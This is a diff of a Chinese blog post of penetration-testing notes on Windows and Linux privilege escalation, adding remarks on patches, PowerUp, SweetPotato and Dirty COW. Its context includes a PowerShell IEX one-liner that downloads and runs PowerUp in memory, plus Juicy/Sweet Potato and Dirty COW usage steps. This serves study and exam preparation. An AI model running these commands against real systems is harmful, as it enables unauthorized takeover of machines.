@@ -52,7 +52,7 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240213105341345.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240213105405202.png">
 <meta property="article:published_time" content="2024-02-12T00:40:38.000Z">
-<meta property="article:modified_time" content="2024-02-13T03:00:09.861Z">
+<meta property="article:modified_time" content="2024-03-10T14:19:01.728Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -256,7 +256,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          9.8k words
+          10k words
         
       </span>
     
@@ -267,7 +267,7 @@
         
         
         
-          82 mins
+          84 mins
         
       </span>
     
@@ -364,6 +364,7 @@
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">wmic qfe <span class="hljs-built_in">get</span> Caption,Description,HotFixID,InstalledOn<br><br>wmic qfe <span class="hljs-built_in">get</span> Caption,Description,HotFixID,InstalledOn | findstr /C:<span class="hljs-string">&quot;KBxxxxxx&quot;</span> /C:<span class="hljs-string">&quot;KBxxxxxx&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212091939430.png" srcset="/img/loading.gif" lazyload alt="image-20240212091939430"></p>
+<p>KB 开头的就是补丁</p>
 </li>
 <li><p>杀软收集</p>
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240212092039878.png" srcset="/img/loading.gif" lazyload alt="image-20240212092039878"></p>
@@ -385,6 +386,7 @@
 <ul>
 <li>PowerUP</li>
 </ul>
+<p>  该工具用的很多，并且很多考试这个工具是能使用的</p>
 <p>  Powershell提权框架 -  Powerup，此框架可以在内核提权行不通的时候，帮助我们寻找服务器脆弱点进而通过脆弱点实现提权的目的。  </p>
 <pre><code class="hljs">[https://github.com/PowerShellMaﬁa/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)  
 </code></pre>
@@ -407,7 +409,6 @@
 
 <p>  内存加载</p>
   <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">powershell -<span class="hljs-keyword">nop </span>-exec <span class="hljs-keyword">bypass </span>-c <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#x27;); Invoke-AllChecks&quot;</span><br></code></pre></td></tr></table></figure>
-
 <p>  我们可以将这个脚本放置到服务器上面</p>
 <h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ul>
 <li><p>发现已知的内核信息</p>
@@ -462,7 +463,7 @@
 <p>开启DCOM 本地支持RPC或者远程服务器支持RPC并能成功登录</p>
 <p>能够找到可用的COM对象 </p>
 </blockquote>
-<p> 一般从Web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。   一般大多数的服务型账户IIS、MSSQL等，有这个权限，大多数用户级的账户没有这个权限，都可以执  行 whoami &#x2F;priv 查看是否具有权限。</p>
+<p> 一般从Web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。   一般大多数的服务型账户IIS、MSSQL等，有这个权限，大多数用户级的账户没有这个权限，都可以执 行 whoami &#x2F;priv 查看是否具有权限。</p>
 <p>查看当前的用户权限</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br><span class="hljs-built_in">whoami</span> /priv<br></code></pre></td></tr></table></figure>
 
@@ -483,6 +484,7 @@
 <p>根据操作系统选择可用的CLSID  </p>
 <p><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a>  </p>
 <p>其实CLSID也就是GUID，是区分每个系统组件唯一的识别码。我们通过CLSID就可以快捷的打开系统组件，这样可以让我们的操作更加方便。</p>
+<p>现在这个已经被剔除了</p>
 <p>CLSID或类标识符是一串字母数字（数字和字母字符）符号，用于表示组件对象模型或基于 COM 的  程序的特定实例。它允许操作系统和软件（尤其是 Windows 操作系统和软件）检测和访问软件组件，  而无需通过其名称进行识别。尽管微软已经逐步淘汰了COM的使用，转而使用.NET基础结构，但COM  仍然是许多常用程序的重要组成部分，并且没有停止使用的计划。  </p>
 <figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs subunit">添加网络位置<br>shell:::&#123;D4480A50-BA28<span class="hljs-string">-11</span>d1<span class="hljs-string">-8</span>E75<span class="hljs-string">-00</span>C04FA31A86&#125;<br><br>管理工具<br>shell:::&#123;D20EA4E1<span class="hljs-string">-3957</span><span class="hljs-string">-11</span>d2-A40B<span class="hljs-string">-0</span>C5020524153&#125;<br><br>所有控制面板项<br>shell:::&#123;21EC2020<span class="hljs-string">-3</span>AEA<span class="hljs-string">-1069</span>-A2DD<span class="hljs-string">-08002</span>B30309D&#125;<br><br>所有设置<br>shell:::&#123;5ED4F38C-D3FF<span class="hljs-string">-4</span>D61-B506<span class="hljs-string">-6820320</span>AEBFE&#125;<br><br>所有任务<br>shell:::&#123;ED7BA470<span class="hljs-string">-8</span>E54<span class="hljs-string">-465</span>E<span class="hljs-string">-825</span>C<span class="hljs-string">-99712043</span>E01C&#125;<br><br>应用<br>shell:::&#123;4234d49b<span class="hljs-string">-0245</span><span class="hljs-string">-4</span>df3-b780<span class="hljs-string">-3893943456</span>e1&#125;<br><br>AppSuggestedLocations<br>shell:::&#123;c57a6066<span class="hljs-string">-66</span>a3<span class="hljs-string">-4</span>d91<span class="hljs-string">-9</span>eb9<span class="hljs-string">-41532179</span>f0a5&#125;<br><br>ActiveX缓存文件夹<br>shell:::&#123;88C6C381<span class="hljs-string">-2</span>E85<span class="hljs-string">-11</span>D0<span class="hljs-string">-94</span>DE<span class="hljs-string">-444553540000</span>&#125;<br><br>自动播放<br>shell:::&#123;9C60DE1E-E5FC<span class="hljs-string">-40</span>f4-A487<span class="hljs-string">-460851</span>A8D915&#125;<br><br>备份和还原（Windows7）<br>shell:::&#123;B98A2BEA<span class="hljs-string">-7</span>D42<span class="hljs-string">-4558</span><span class="hljs-string">-8</span>BD1<span class="hljs-string">-832</span>F41BAC6FD&#125;<br><br>BitLocker驱动器加密<br>shell:::&#123;D9EF8727-CAC2<span class="hljs-string">-4</span>e60<span class="hljs-string">-809</span>E<span class="hljs-string">-86</span>F80A666C91&#125;<br><br>蓝牙设备<br>shell:::&#123;28803F59<span class="hljs-string">-3</span>A75<span class="hljs-string">-4058</span><span class="hljs-string">-995</span>F<span class="hljs-string">-4</span>EE5503B023C&#125;<br><br>Briefcase<br>shell:::&#123;85BBD920<span class="hljs-string">-42</span>A0<span class="hljs-string">-1069</span>-A2E4<span class="hljs-string">-08002</span>B30309D&#125;<br><br>Cabinet Shell文件夹<br>shell:::&#123;0CD7A5C0<span class="hljs-string">-9</span>F37<span class="hljs-string">-11</span>CE-AE65<span class="hljs-string">-08002</span>B2E1262&#125;<br><br>命令文件夹<br>shell:::&#123;437ff9c0-a07f<span class="hljs-string">-4</span>fa0-af80<span class="hljs-string">-84</span>b6c6440a16&#125;<br><br>Common Places FS Folder<br>shell:::&#123;d34a6ca6<span class="hljs-string">-62</span>c2<span class="hljs-string">-4</span>c34<span class="hljs-string">-8</span>a7c<span class="hljs-string">-14709</span>c1ad938&#125;<br><br>CompressedFolder<br>shell:::&#123;E88DCCE0-B7B3<span class="hljs-string">-11</span>d1-A9F0<span class="hljs-string">-00</span>AA0060FA31&#125;<br><br>连接到<br>shell:::&#123;38A98528<span class="hljs-string">-6</span>CBF<span class="hljs-string">-4</span>CA9<span class="hljs-string">-8</span>DC0-B1E1D10F7B1B&#125;<br><br>控制面板<br>shell:::&#123;26EE0668-A00A<span class="hljs-string">-44</span>D7<span class="hljs-string">-9371</span>-BEB064C98683&#125;<br><br>控制面板<br>shell:::&#123;5399E694<span class="hljs-string">-6</span>CE5<span class="hljs-string">-4</span>D6C<span class="hljs-string">-8</span>FCE<span class="hljs-string">-1</span>D8870FDCBA0&#125;<br><br>凭据管理器<br>shell:::&#123;1206F5F1<span class="hljs-string">-0569</span><span class="hljs-string">-412</span>C<span class="hljs-string">-8</span>FEC<span class="hljs-string">-3204630</span>DFB70&#125;<br></code></pre></td></tr></table></figure>
 
@@ -500,10 +502,16 @@
 </blockquote>
 <p>如果将执行的程序变成payload 就可以直接反弹一个system 的权限</p>
 <p>webshell 添加用户，同时也能执行命令或者是payload</p>
+</li>
+<li><p>使用SweetPotato.exe </p>
+<p>该脚本不需要获取了远程桌面，可以使用webshell 执行的juicePotato</p>
 <blockquote>
-<p>  <a target="_blank" rel="noopener" href="https://github.com/uknowsec/SweetPotato">https://github.com/uknowsec/SweetPotato</a>  </p>
+<p>SweetPotato.exe -a whoami</p>
 </blockquote>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">SweetPotato<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">a</span> whoami<br></code></pre></td></tr></table></figure></li>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/uknowsec/SweetPotato">https://github.com/uknowsec/SweetPotato</a></p>
+</blockquote>
+</li>
 </ol>
 <h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul>
 <li>前期信息收集  </li>
@@ -557,6 +565,7 @@
 <h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="脏牛提权漏洞"><a href="#脏牛提权漏洞" class="headerlink" title="脏牛提权漏洞"></a>脏牛提权漏洞</h3><p>漏洞名称：脏牛（Dirty COW）  </p>
 <p>漏洞危害：低权限用户利用该漏洞技术可以在全版本 Linux 系统上实现本地提权  </p>
 <p>影响范围：Linux 内核2.6.22 &lt; 3.9 (x86&#x2F;x64)  </p>
+<p>核心： 改写没有写权限的文件(默认： &#x2F;etc&#x2F;passwd)，然后改掉了id 为0 的用户，相当于替换root 用户</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">POC： https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/FireFart/</span>dirtycow<br><br>gcc编译： gcc -pthread ditry.c -o dirty -lcrypt<br><br>替换root用户： ./dirty password<br></code></pre></td></tr></table></figure>
 
 <p>现在模拟一下利用</p>
